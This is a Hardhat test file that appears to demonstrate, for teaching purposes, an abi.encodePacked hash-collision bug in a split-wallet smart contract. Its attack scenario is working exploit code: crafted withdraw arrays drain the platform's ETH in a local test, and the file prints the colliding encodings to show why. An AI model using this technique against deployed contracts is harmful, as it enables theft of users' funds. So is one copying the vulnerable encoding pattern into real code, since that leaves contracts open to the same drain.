const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Split Wallet Platform", function () {
  
  async function deploy() {
    /// Get accounts
    let [deployer, rich, bob, alice, attacker] = await ethers.getSigners();

    /// Deploy testing contracts
    const SplitPlatform = await ethers.getContractFactory("SplitPlatform");
    const splitPlatform = await SplitPlatform.connect(deployer).deploy();

    /// Bob creates a split wallet contract for himself and Alice
    let accounts = [bob.address, alice.address];
    let percents = [50, 50];
    const createSplitTx = await splitPlatform.connect(bob).createSplit(accounts, percents);
    const createSplitTxData = await createSplitTx.wait();
    const createSplitTxEvent = createSplitTxData.events.find(event => event.event === "CreateSplit");
    let [bobaliceWalletId, bobaliceWalletAddress, owners, pers] = createSplitTxEvent.args;
    expect(bobaliceWalletId).to.equal(0);
    expect(owners[0]).to.equal(accounts[0]);
    expect(owners[1]).to.equal(accounts[1]);
    expect(pers[0]).to.equal(percents[0]);
    expect(pers[1]).to.equal(percents[1]);

    const SplitWalletFactory = await ethers.getContractFactory("SplitWallet");
    const bobaliceWallet = SplitWalletFactory.attach(bobaliceWalletAddress);

    return { splitPlatform, bobaliceWalletId, bobaliceWallet, deployer, rich, bob, alice, attacker };
  }

  describe("Using of improper encoding data can be lead to critical issue", () => {
    it("Normal Scenario: Rich guy paying Bob and Alice via the split wallet", async () => {
      const { splitPlatform, bobaliceWalletId, bobaliceWallet, deployer, rich, bob, alice, attacker } = await deploy();
      let bobaliceBalance = await splitPlatform.balances(bobaliceWallet.address);
      console.log(`--- Bob&Alice's split wallet before the deposit ---`);
      console.log(`walletId     : ${bobaliceWalletId}`);
      console.log(`walletAddress: ${bobaliceWallet.address}`);
      console.log(`balance      : ${ethers.utils.formatEther(bobaliceBalance)} ETH`);
      /// Rich guy deposit 100 ETH to Bob&Alice's split wallet
      const amountToDeposit = ethers.utils.parseEther("100"); // 100 ETH
      await splitPlatform.connect(rich).deposit(bobaliceWalletId, {value: amountToDeposit});
      console.log(`--- Bob&Alice's split wallet after the deposit ---`);
      bobaliceBalance = await splitPlatform.balances(bobaliceWallet.address);
      console.log(`balance      : ${ethers.utils.formatEther(bobaliceBalance)} ETH`);
      
      console.log(`--- Before the withdraw ---`);
      let bobBalance = await ethers.provider.getBalance(bob.address);
      let aliceBalance = await ethers.provider.getBalance(alice.address);
      console.log(`bob.balance   : ${ethers.utils.formatEther(bobBalance)} ETH`);
      console.log(`alice.balance : ${ethers.utils.formatEther(aliceBalance)} ETH`);
      /// Bob execute withdraw function in split wallet contract
      let accounts = [bob.address, alice.address];
      let percents = [50, 50];
      await bobaliceWallet.connect(bob).withdraw(accounts, percents);
      console.log(`--- After the withdraw ---`);
      bobBalance = await ethers.provider.getBalance(bob.address);
      aliceBalance = await ethers.provider.getBalance(alice.address);
      console.log(`bob.balance   : ${ethers.utils.formatEther(bobBalance)} ETH`);
      console.log(`alice.balance : ${ethers.utils.formatEther(aliceBalance)} ETH`);
    });

    it("Attack Scenario: Attacker create a split wallet and drain ETH from platfrom by using malicious withdraw data", async () => {
      const { splitPlatform, bobaliceWalletId, bobaliceWallet, deployer, rich, bob, alice, attacker  } = await deploy();
      /// Rich guy deposit 100 ETH to Bob&Alice's split wallet
      const amountToDeposit = ethers.utils.parseEther("100"); // 100 ETH
      await splitPlatform.connect(rich).deposit(bobaliceWalletId, {value: amountToDeposit});

      console.log(`--- Before the attack ---`);
      let platfromBalance = await ethers.provider.getBalance(splitPlatform.address);
      let attackerBalance = await ethers.provider.getBalance(attacker.address);
      console.log(`platfrom.balance : ${ethers.utils.formatEther(platfromBalance)} ETH`);
      console.log(`attacker.balance : ${ethers.utils.formatEther(attackerBalance)} ETH`);

      /// Attacker create a split wallet with
      /*
        maliciousAddress will be the percentage of amountTodeposit to (platfromBalance + amountTodeposit)
        maliciousAddress = (platfromBalance + amountTodeposit) * 100 / amountTodeposit
      */
      let amountTodeposit = ethers.utils.parseEther("1"); // 1 ETH
      let maliciousAddressInt = platfromBalance.add(amountTodeposit).mul(100).div(amountTodeposit);
      console.log(`maliciousAddressInt: ${maliciousAddressInt}`);
      console.log(`maliciousAddress   : ${maliciousAddressInt.toHexString()}`);
      let maliciousAddress = ethers.utils.hexZeroPad(maliciousAddressInt.toHexString(), 20);
      let accounts = [attacker.address, maliciousAddress];
      let percents = [50,50]; // can be whatever but 100% in total
      const createSplitTx = await splitPlatform.connect(attacker).createSplit(accounts, percents);
      const createSplitTxData = await createSplitTx.wait();
      const createSplitTxEvent = createSplitTxData.events.find(event => event.event === "CreateSplit");
      let [attackerWalletId, attackerWalletAddress, owners, pers] = createSplitTxEvent.args;
      console.log(`--- Attacker's split wallet info ---`);
      console.log(`walletId     : ${attackerWalletId}`);
      console.log(`walletAddress: ${attackerWalletAddress}`);
      console.log(`owners       : [${owners}]`);
      console.log(`percents     : [${pers}]`);
      /// Attacker deposit to platfrom
      await splitPlatform.connect(attacker).deposit(attackerWalletId, {value: amountTodeposit});

      /// Attacker drain ETH by execute withdraw() with malicious data
      let maliciousAccounts = [attacker.address];
      let maliciousPercents = [maliciousAddress, 50, 50];
      const SplitWalletFactory = await ethers.getContractFactory("SplitWallet");
      const attackerWallet = SplitWalletFactory.attach(attackerWalletAddress);
      await attackerWallet.connect(attacker).withdraw(maliciousAccounts, maliciousPercents);

      console.log(`--- After the attack ---`);
      platfromBalance = await ethers.provider.getBalance(splitPlatform.address);
      attackerBalance = await ethers.provider.getBalance(attacker.address);
      console.log(`platfrom.balance : ${ethers.utils.formatEther(platfromBalance)} ETH`);
      console.log(`attacker.balance : ${ethers.utils.formatEther(attackerBalance)} ETH`);

      console.log(`--- How did the attack work? ---`);
      /// cause the calculateHash() is using abi.encodePacked() when encode the dynamic array
      const encodedNormalData = ethers.utils.solidityPack(
        ['address[]', 'uint256[]'],
        [accounts, percents]
      );
      const encodedMaliciousData = ethers.utils.solidityPack(
        ['address[]', 'uint256[]'],
        [maliciousAccounts, maliciousPercents]
      );
      const hashNormalData = ethers.utils.solidityKeccak256(
        ['address[]', 'uint256[]'],
        [accounts, percents]
      );
      const hashMaliciousData = ethers.utils.solidityKeccak256(
        ['address[]', 'uint256[]'],
        [maliciousAccounts, maliciousPercents]
      );

      console.log(`Normal data:`);
      console.log(`accounts : [${accounts}]`);
      console.log(`percents : [${percents}]`);
      console.log(`encodedNormalData    :`);
      prettyPrintBytes(encodedNormalData);
      console.log(`keccak256(encodedNormalData)    : ${hashNormalData}`);

      console.log(`Malicious data:`);
      console.log(`accounts : [${maliciousAccounts}]`);
      console.log(`percents : [${maliciousPercents}]`);
      console.log(`encodedMaliciousData :`);
      prettyPrintBytes(encodedMaliciousData);
      console.log(`keccak256(encodedMaliciousData) : ${hashMaliciousData}`);
    });
  });

  function prettyPrintBytes(data) {
    const rows = (data.length-2)/2/32;
    for(let i=0;i<rows;i++){
      let row_data = ethers.utils.hexDataSlice(data, 32*i, 32*(i)+32);
      console.log(`    ${i<10?"0"+i:i}: ${row_data}`);
    }
  } 
});
